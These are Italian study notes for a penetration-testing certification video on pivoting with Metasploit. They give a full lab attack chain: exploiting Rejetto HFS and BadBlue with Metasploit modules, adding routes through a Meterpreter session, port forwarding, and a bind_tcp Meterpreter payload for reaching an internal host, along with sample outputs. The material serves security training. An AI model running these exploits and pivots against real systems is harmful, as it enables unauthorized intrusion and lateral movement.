# 012 — Pivoting & Port Forwarding with Metasploit (Lateral Movement & Pivoting)

> **Modulo:** Lateral Movement & Pivoting · **Video:** 12/16
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [012_Pivoting & Port Forwarding with Metasploit.txt](012_Pivoting & Port Forwarding with Metasploit.txt) · [012_Pivoting & Port Forwarding with Metasploit.srt](012_Pivoting & Port Forwarding with Metasploit.srt)

## Concetti chiave

- **Pivoting** = usare un host compromesso (**pivot point**) per raggiungere reti/sistemi a noi non direttamente accessibili.
- **Port forwarding** è UNA delle tecniche per realizzare il pivoting (l'altra principale: SOCKS proxy → video 013).
- In Metasploit i due ingredienti sono:
  1. **`run autoroute`** (o `route add`) → aggiunge un network route DENTRO MSF; tutto il traffico MSF verso quella subnet passa dal Meterpreter.
  2. **`portfwd add`** → forward di una singola porta remota su una porta locale Kali (single-port tunnel esposto fuori MSF).
- Il pivot point agisce come **proxy** tra attacker e rete interna.
- **Reverse payload ≠ funziona** sul target post-pivot: il target interno non ha route verso Kali → usa **bind payload** (`windows/meterpreter/bind_tcp`).
- `portfwd` espone la porta forwardata a livello Kali OS → utilizzabile con `nmap`, `curl`, `proxychains` NO (è single port).

## Spiegazione approfondita

### Topologia tipica del pivoting
```
                      ╔═══════════════════════════╗
                      ║   RETE ESTERNA / DMZ      ║
[Kali Attacker] ──────╫──────> [VICTIM 1 / PIVOT] ║
   10.0.0.10          ║         10.0.0.50         ║
                      ╚═════════════│═════════════╝
                                    │ (2nd NIC)
                                    │ 172.16.5.50
                      ╔═════════════│═════════════╗
                      ║   RETE INTERNA            ║
                      ║         [VICTIM 2]        ║
                      ║         172.16.5.100      ║
                      ╚═══════════════════════════╝

Kali NON può raggiungere 172.16.5.0/20 direttamente.
Victim1 PUÒ raggiungere 172.16.5.100.
→ Usiamo Victim1 come pivot.
```

### Step 1 — Compromettere il pivot
Standard exploitation chain. Nel lab il pivot è un Windows Server 2012 con **Rejetto HFS 2.3** vulnerabile → modulo `exploit/windows/http/rejetto_hfs_exec` → Meterpreter.

### Step 2 — Verificare la dual-homed nature
Dentro Meterpreter:
```
meterpreter > ipconfig
# Cerca interfacce con subnet diversa dalla tua
meterpreter > run get_local_subnets
# oppure
meterpreter > route
```

### Step 3 — `autoroute` (aggiunge route DENTRO MSF)
```
meterpreter > run autoroute -s 172.16.5.0/20
# oppure (più moderno)
meterpreter > background
msf6 > route add 172.16.5.0/255.255.240.0 <SESSION_ID>
msf6 > route print
```
Da questo momento **tutti i moduli MSF** che hanno come target un IP in `172.16.5.0/20` saranno automaticamente proxati attraverso la sessione Meterpreter sul pivot.

### Step 4 — Port scan via MSF (no nmap, perché nmap non sa di MSF)
```
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 172.16.5.100
msf6 > set PORTS 1-100
msf6 > run
# Trovi: 80/tcp open
```
Lento ma funziona — il traffico passa via `route`.

### Step 5 — `portfwd` per esporre la porta su Kali OS
Per usare tool esterni a MSF (`nmap`, `curl`, browser, exploit Python…) serve esporre la porta:
```
meterpreter > portfwd add -l 1234 -p 80 -r 172.16.5.100
# Ora su Kali: localhost:1234 ↔ 172.16.5.100:80 (via pivot)
meterpreter > portfwd list
```
- `-l 1234` = porta locale Kali
- `-p 80` = porta remota target
- `-r <IP>` = target interno

Verifica su Kali:
```bash
netstat -antp | grep 1234   # ruby in ascolto
nmap -sS -sV -p 1234 127.0.0.1
# → identifica BadBlue (web server vulnerabile)
```

### Step 6 — Exploit del servizio interno con BIND payload
**Critico**: il target interno non può connettersi a noi (no route inversa) → reverse_tcp **NON funziona**. Usa **bind_tcp**:
- Reverse payload: target → attacker (egress) ❌
- **Bind payload**: attacker → target (ingress, su porta che il target apre) ✓
```
msf6 > use exploit/windows/http/badblue_passthru
msf6 > set payload windows/meterpreter/bind_tcp
msf6 > set RHOSTS 172.16.5.100
msf6 > set LPORT 4444
msf6 > exploit
# → Meterpreter su Victim2 via pivot
```
La connessione bind viene routata automaticamente perché abbiamo già `route add`.

## Comandi & strumenti

```bash
# === Sul pivot Meterpreter ===
meterpreter > sysinfo
meterpreter > ipconfig
meterpreter > getuid
meterpreter > getprivs
meterpreter > run autoroute -s <SUBNET>/<CIDR>
meterpreter > portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <INTERNAL_IP>
meterpreter > portfwd list
meterpreter > portfwd delete -l <LOCAL_PORT> -p <REMOTE_PORT> -r <INTERNAL_IP>
meterpreter > background

# === MSF principale ===
msf6 > route add <SUBNET> <NETMASK> <SESSION_ID>
msf6 > route print
msf6 > route remove <SUBNET> <NETMASK>

# === Port scan via route ===
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS <internal_ip>
msf6 > set PORTS 1-1000
msf6 > run

# === Exploit interno con BIND payload ===
msf6 > set payload windows/meterpreter/bind_tcp
msf6 > set RHOSTS <internal_ip>
msf6 > set LPORT 4444
msf6 > exploit
```

Tool/moduli citati:
- `exploit/windows/http/rejetto_hfs_exec` — exploit pivot
- `post/multi/manage/autoroute` (= `run autoroute`)
- `auxiliary/scanner/portscan/tcp`
- `exploit/windows/http/badblue_passthru` — target interno
- Payload `windows/meterpreter/bind_tcp` (chiave!)

## Esempi pratici

```
# === 1. Compromise pivot ===
msf6 > use exploit/windows/http/rejetto_hfs_exec
msf6 > set RHOSTS 10.0.0.50
msf6 > set LHOST 10.0.0.10
msf6 > exploit
# → Meterpreter session 1 (Victim1)

# === 2. Recon interno ===
meterpreter > ipconfig
# Interface 11: 10.0.0.50/24 (pubblica)
# Interface 21: 172.16.5.50/20 (interna)
meterpreter > shell
C:\> ping 172.16.5.100        # Victim1 raggiunge Victim2
C:\> exit

# === 3. Autoroute ===
meterpreter > run autoroute -s 172.16.5.0/20
# [+] Added route to 172.16.5.0/255.255.240.0 via 10.0.0.50

# === 4. Port scan ===
meterpreter > background
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 172.16.5.100
msf6 > set PORTS 1-100
msf6 > run
# 172.16.5.100:80 - TCP OPEN

# === 5. Port forward per nmap esterno ===
msf6 > sessions 1
meterpreter > portfwd add -l 1234 -p 80 -r 172.16.5.100
meterpreter > background

# (in altro terminale)
$ nmap -sS -sV -p 1234 127.0.0.1
# 1234/tcp open  http  BadBlue httpd 2.7

# === 6. Exploit Victim2 con BIND payload ===
msf6 > use exploit/windows/http/badblue_passthru
msf6 > set payload windows/meterpreter/bind_tcp
msf6 > set RHOSTS 172.16.5.100
msf6 > set LPORT 4444
msf6 > exploit
# → Meterpreter session 2 (Victim2)

meterpreter > sysinfo
# Computer: VICTIM2 / Windows Server 2016
# IP: 172.16.5.100
```

## Punti d'attenzione per l'esame eCPPT

- **Comandi da sapere a memoria**:
  - `run autoroute -s <subnet>/<cidr>` (dentro Meterpreter)
  - `route add <net> <mask> <session>` (in msf prompt)
  - `portfwd add -l <lport> -p <rport> -r <ip>` (Meterpreter)
- **`autoroute` = solo Metasploit-aware**. Funziona per moduli MSF, NON per `nmap`/`curl`/exploit esterni.
- **`portfwd` = single port**, esposto a livello OS Kali → usabile con qualsiasi tool, ma una porta alla volta. Per tutto-il-traffico usa **SOCKS proxy** (video 013).
- **BIND vs REVERSE payload** post-pivot: domanda quasi certa.
  - Pivot iniziale (esposto a internet) → reverse OK.
  - Target interno post-pivot → **BIND obbligatorio** (no route inversa).
- **Direzione port forwarding**: questo è **local port forwarding** (porta remota esposta su locale). Concetto chiarito meglio nel video 014 (SSH tunneling).
- **`autoroute` si appoggia su `route add`** internamente.
- **Limite portscan/tcp via route**: lentissimo. Limita PORTS a poche centinaia.
- **`portfwd list`** per vedere i forward attivi; `portfwd flush` per ripulire.
- **CIDR + Netmask del lab**: 255.255.240.0 = /20. Saperla riconoscere.
- **Una sola Meterpreter session = un solo route hop**. Multi-hop pivot = ripeti l'intero pattern su una seconda sessione.

## Collegamenti con altri video

- Precedente: [[011_Linux Lateral Movement Techniques]]
- Prossimo (system-wide proxy): [[013_Pivoting with SOCKS Proxy]]
- Approccio nativo OS: [[014_Pivoting via SSH Tunneling]]
- Pivoting senza privilegi root: [[015_Pivoting with reGeorg]]
- PtH per ottenere il foothold pivot: [[09_Pass-the-Hash with Metasploit]]
